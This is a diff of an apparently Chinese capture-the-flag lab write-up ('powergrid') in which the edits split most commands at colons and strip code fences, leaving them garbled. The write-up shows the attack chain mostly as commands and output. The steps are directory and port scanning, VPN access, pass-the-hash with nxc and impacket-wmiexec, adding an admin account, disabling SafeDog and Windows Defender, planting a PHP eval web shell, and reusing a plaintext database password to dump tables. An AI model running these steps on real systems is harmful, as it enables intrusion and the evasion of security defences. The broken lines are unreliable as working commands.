@@ -54,7 +54,8 @@ Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds
 扫目录不会触发waf
 
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
-└─# dirsearch -u http://121.89.87.130:8080/ -x 403,404
+└─# dirsearch -u http://121.89.87.130:
+8080/ -x 403,404
 
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
@@ -63,14 +64,16 @@ Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist
 
 Output File: /root/Desktop/ChunQiu/powergrid/reports/http_121.89.87.130_8080/__26-02-09_08-13-10.txt
 
-Target: http://121.89.87.130:8080/
+Target: http://121.89.87.130:
+8080/
 
 [08:13:10] Starting:
 [08:13:23] 400 -  800B  - /..................etcpasswd
 [08:13:24] 400 -  800B  - /a%5c.aspx
 [08:13:48] 200 -   66KB - /favicon.ico
 [08:13:52] 200 -    5KB - /index.html
-[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:8080/login?logout
+[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:
+8080/login?logout
 [08:14:12] 200 -   90B  - /swagger-resources
 [08:14:16] 200 -  135B  - /v2/api-docs
 
@@ -104,38 +107,50 @@ net user Administrator Admin123
 
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# openvpn zhangsan.ovpn
-2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
+2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:
+AES-128-GCM:
+CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
 2026-02-09 08:27:43 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
 2026-02-09 08:27:43 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
 2026-02-09 08:27:43 library versions: OpenSSL 3.5.4 30 Sep 2025, LZO 2.10
 2026-02-09 08:27:43 DCO version: N/A
 Enter Auth Username: zhangsan
 Enter Auth Password: ••••••••••••••••
-2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:51 Socket Buffers: R=[212992->212992] S=[212992->212992]
 2026-02-09 08:27:51 UDPv4 link local: (not bound)
-2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:55 Server poll timeout, restarting
 2026-02-09 08:27:55 SIGUSR1[soft,server_poll] received, process restarting
-2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:55 Socket Buffers: R=[212992->212992] S=[212992->212992]
 2026-02-09 08:27:55 UDPv4 link local: (not bound)
-2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:59 Server poll timeout, restarting
 2026-02-09 08:27:59 SIGUSR1[soft,server_poll] received, process restarting
-2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:443
+2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+443
 2026-02-09 08:27:59 Socket Buffers: R=[131072->131072] S=[16384->16384]
-2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:443
+2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:
+443
 ^C2026-02-09 08:27:59 SIGINT[hard,init_instance] received, process exiting
 
 把这个vpn服务器的内网IP改成外网入口IP即可连上
 
 连上后给我们分配了一个172.27.236.3的ip
 
-15: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
+15: tun0:  mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
     inet 172.27.236.3/22 scope global tun0
        valid_lft forever preferred_lft forever
-    inet6 fe80::b8f0:cb7a:a44c:7c88/64 scope link stable-privacy proto kernel_ll
+    inet6 fe80::
+b8f0:
+cb7a:
+a44c:
+7c88/64 scope link stable-privacy proto kernel_ll
        valid_lft forever preferred_lft forever
 
 unsetunset3. flag3unsetunset
@@ -293,17 +308,28 @@ unsetunset4. flag04unsetunset
 
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# nxc smb 172.16.200.78  -u administrator -H da6df19610xxxxxxxxxxxxxxxx
-SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:DATA) (domain:data) (signing:False) (SMBv1:True)
-SMB         172.16.200.78   445    DATA             [+] dataadministrator:da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)
+SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:
+DATA) (domain:
+data) (signing:
+False) (SMBv1:
+True)
+SMB         172.16.200.78   445    DATA             [+] dataadministrator:
+da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)
 
 尝试rdp失败
 
-xfreerdp /v:172.16.200.78 /u:administrator /pth:da6df1961007axxxxxxxxxxxxx /cert:ignore /drive:share,/tmp +clipboard
+xfreerdp /v:
+172.16.200.78 /u:
+administrator /pth:
+da6df1961007axxxxxxxxxxxxx /cert:
+ignore /drive:
+share,/tmp +clipboard
 
 改用wimiexec
 
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
-└─# impacket-wmiexec administrator@172.16.200.78 -hashes :da6df196100xxxxxxxxxxxxxxxxx -codec gbk
+└─# impacket-wmiexec administrator@172.16.200.78 -hashes :
+da6df196100xxxxxxxxxxxxxxxxx -codec gbk
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] SMBv3.0 dialect used
@@ -312,15 +338,19 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 C:>reg add "HKLMSystemCurrentControlSetControlLsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
 操作成功完成。
 
-C:>type C:usersadministratorflagflag.txt
+C:>type C:
+usersadministratorflagflag.txt
 flag{548fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb}
 
 看一下目录有什么
 
-dc:usersadministrator>tree . /f /a
+dc:
+usersadministrator>tree . /f /a
 文件夹 PATH 列表
-卷序列号为 00000244 8E66:8577
-C:USERSADMINISTRATOR
+卷序列号为 00000244 8E66:
+8577
+C:
+USERSADMINISTRATOR
 +---.sdb
 |       jdbctrace.shm
 |
@@ -355,7 +385,8 @@ unsetunset5. flag5unsetunset
 
 5.1. mysql
 
-在C:UsersAdministratorDesktoplarkmt-adminconfapplication.yml 发现数据库密码
+在C:
+UsersAdministratorDesktoplarkmt-adminconfapplication.yml 发现数据库密码
 
 server:
   port: 8080
@@ -365,7 +396,9 @@ spring:
   datasource:
     username: root
     password: rjS8K2RW7KE4E1vk
-    url: jdbc:mysql://172.16.200.81:3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
+    url: jdbc:
+mysql://172.16.200.81:
+3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
     
 ...<SNIP>...
 
@@ -479,13 +512,9 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 Nmap done: 1 IP address (1 host up) scanned in 72.16 seconds
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
-└─# dirsearch -u http://121.89.87.130:8080/ -x 403,404
+└─# dirsearch -u http://121.89.87.130:
+8080/ -x 403,404
 
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
@@ -494,69 +523,63 @@ Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist
 
 Output File: /root/Desktop/ChunQiu/powergrid/reports/http_121.89.87.130_8080/__26-02-09_08-13-10.txt
 
-Target: http://121.89.87.130:8080/
+Target: http://121.89.87.130:
+8080/
 
 [08:13:10] Starting:
 [08:13:23] 400 -  800B  - /..................etcpasswd
 [08:13:24] 400 -  800B  - /a%5c.aspx
 [08:13:48] 200 -   66KB - /favicon.ico
 [08:13:52] 200 -    5KB - /index.html
-[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:8080/login?logout
+[08:13:56] 302 -    0B  - /logout  ->  http://121.89.87.130:
+8080/login?logout
 [08:14:12] 200 -   90B  - /swagger-resources
 [08:14:16] 200 -  135B  - /v2/api-docs
 
 Task Completed
-```
-
-
-
-```
 net user Administrator Admin123
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# openvpn zhangsan.ovpn
-2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
+2026-02-09 08:27:43 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:
+AES-128-GCM:
+CHACHA20-POLY1305). OpenVPN ignores --cipher for cipher negotiations.
 2026-02-09 08:27:43 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
 2026-02-09 08:27:43 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
 2026-02-09 08:27:43 library versions: OpenSSL 3.5.4 30 Sep 2025, LZO 2.10
 2026-02-09 08:27:43 DCO version: N/A
 Enter Auth Username: zhangsan
 Enter Auth Password: ••••••••••••••••
-2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:51 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:51 Socket Buffers: R=[212992->212992] S=[212992->212992]
 2026-02-09 08:27:51 UDPv4 link local: (not bound)
-2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:51 UDPv4 link remote: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:55 Server poll timeout, restarting
 2026-02-09 08:27:55 SIGUSR1[soft,server_poll] received, process restarting
-2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:55 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:55 Socket Buffers: R=[212992->212992] S=[212992->212992]
 2026-02-09 08:27:55 UDPv4 link local: (not bound)
-2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:1194
+2026-02-09 08:27:55 UDPv4 link remote: [AF_INET]172.16.200.87:
+1194
 2026-02-09 08:27:59 Server poll timeout, restarting
 2026-02-09 08:27:59 SIGUSR1[soft,server_poll] received, process restarting
-2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:443
+2026-02-09 08:27:59 TCP/UDP: Preserving recently used remote address: [AF_INET]172.16.200.87:
+443
 2026-02-09 08:27:59 Socket Buffers: R=[131072->131072] S=[16384->16384]
-2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:443
+2026-02-09 08:27:59 Attempting to establish TCP connection with [AF_INET]172.16.200.87:
+443
 ^C2026-02-09 08:27:59 SIGINT[hard,init_instance] received, process exiting
-```
-
-
-
-```
-15: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
+15: tun0:  mtu 1420 qdisc fq_codel state UNKNOWN group default qlen 500    link/none
     inet 172.27.236.3/22 scope global tun0
        valid_lft forever preferred_lft forever
-    inet6 fe80::b8f0:cb7a:a44c:7c88/64 scope link stable-privacy proto kernel_ll
+    inet6 fe80::
+b8f0:
+cb7a:
+a44c:
+7c88/64 scope link stable-privacy proto kernel_ll
        valid_lft forever preferred_lft forever
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# fping -agq 172.27.236.3、24
 
@@ -566,11 +589,6 @@ Enter Auth Password: ••••••••••••••••
 172.16.200.78
 172.16.200.81
 172.16.200.87
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# nmap 172.16.200.87 -Pn
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:34 EST
@@ -616,11 +634,6 @@ Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 68.70% done; ETC: 08:35 (0:00:07 remaining)
 Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 75.90% done; ETC: 08:35 (0:00:10 remaining)
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# nmap 172.16.200.76 -Pn -p 22,80,443,8080,3389
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 08:48 EST
@@ -635,11 +648,6 @@ PORT     STATE  SERVICE
 8080/tcp closed http-proxy
 
 Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# dirsearch -u 172.16.200.76 -x 403,404
 
@@ -660,18 +668,8 @@ Target: http://172.16.200.76/
 [08:49:53] 200 -    1KB - /upload.php
 
 Task Completed
-```
-
-
-
-```
 net user c1trus Admin123 /add
 net localgroup administrators c1trus /add
-```
-
-
-
-```
 net stop SafeDogGuardCenter
 net stop "Safedog Update Center"
 net stop SafeDogCloudHelper
@@ -683,40 +681,26 @@ taskkill /F /PID 8620
 powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
 net stop WinDefend
 net stop WdNisSvc
-```
-
-
-
-```
 powershell -c "Set-Content -Path gsl.php -Value '<?php eval($_POST["pass"]);'"
-```
-
-
-
-```
 connect 172.16.200.76 12345
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# nxc smb 172.16.200.78  -u administrator -H da6df19610xxxxxxxxxxxxxxxx
-SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:DATA) (domain:data) (signing:False) (SMBv1:True)
-SMB         172.16.200.78   445    DATA             [+] dataadministrator:da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)
-```
-
-
-
-```
-xfreerdp /v:172.16.200.78 /u:administrator /pth:da6df1961007axxxxxxxxxxxxx /cert:ignore /drive:share,/tmp +clipboard
-```
-
-
-
-```
+SMB         172.16.200.78   445    DATA             [*] Windows Server 2016 Datacenter 14393 x64 (name:
+DATA) (domain:
+data) (signing:
+False) (SMBv1:
+True)
+SMB         172.16.200.78   445    DATA             [+] dataadministrator:
+da6df1961007xxxxxxxxxxxxxxxxxxx (Pwn3d!)
+xfreerdp /v:
+172.16.200.78 /u:
+administrator /pth:
+da6df1961007axxxxxxxxxxxxx /cert:
+ignore /drive:
+share,/tmp +clipboard
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
-└─# impacket-wmiexec administrator@172.16.200.78 -hashes :da6df196100xxxxxxxxxxxxxxxxx -codec gbk
+└─# impacket-wmiexec administrator@172.16.200.78 -hashes :
+da6df196100xxxxxxxxxxxxxxxxx -codec gbk
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] SMBv3.0 dialect used
@@ -725,17 +709,16 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 C:>reg add "HKLMSystemCurrentControlSetControlLsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
 操作成功完成。
 
-C:>type C:usersadministratorflagflag.txt
+C:>type C:
+usersadministratorflagflag.txt
 flag{548fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb}
-```
-
-
-
-```
-dc:usersadministrator>tree . /f /a
+dc:
+usersadministrator>tree . /f /a
 文件夹 PATH 列表
-卷序列号为 00000244 8E66:8577
-C:USERSADMINISTRATOR
+卷序列号为 00000244 8E66:
+8577
+C:
+USERSADMINISTRATOR
 +---.sdb
 |       jdbctrace.shm
 |
@@ -765,11 +748,6 @@ C:USERSADMINISTRATOR
 |       flag.txt
 |
 ...<SNIP>...
-```
-
-
-
-```
 server:
   port: 8080
 
@@ -778,14 +756,11 @@ spring:
   datasource:
     username: root
     password: rjS8K2RW7KE4E1vk
-    url: jdbc:mysql://172.16.200.81:3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
+    url: jdbc:
+mysql://172.16.200.81:
+3306/web?serverTimezone=Asia/Shanghai&useLegacyDatetimeCode=false&useSSL=false&nullNamePatternMatchesAll=true&useUnicode=true&characterEncoding=UTF-8
     
 ...<SNIP>...
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# mysql -h 172.16.200.81 -u root -p'rjS8K2RW7KE4E1vk' --skip-ssl web
 Reading table information for completion of table and column names
@@ -848,11 +823,6 @@ MySQL [web]> select * from job_user_datas limit 10;
 +----+-----------+-------------+--------------------+---------------------+---------------------+---------------------+
 .......
 10 rows inset (0.049 sec)
-```
-
-
-
-```
 ┌──(root㉿kali)-[~/Desktop/ChunQiu/powergrid]
 └─# echo -n "job_user_datasxxxxx" | md5sum
 212c1xxxxxxxxxxxxxxxxxxxxxxxx  -
